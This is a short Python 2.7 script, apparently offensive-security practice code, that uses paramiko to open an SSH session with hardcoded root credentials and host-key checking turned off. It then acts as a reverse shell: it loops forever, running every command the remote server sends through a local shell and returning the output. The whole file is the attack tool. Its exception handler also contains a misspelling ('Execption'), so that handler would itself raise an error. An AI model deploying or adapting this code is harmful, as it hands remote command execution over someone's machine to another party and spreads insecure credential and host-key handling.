#!/usr/bin/python2.7
import threading, paramiko, subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('my/home/path')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print ssh_session.recv(1024) #reading the banner
        while True:
            command = ssh_session.recv(1024) # get the command from the ssh server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Execption,e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('localhost', 'root', 'toor', 'pwd')
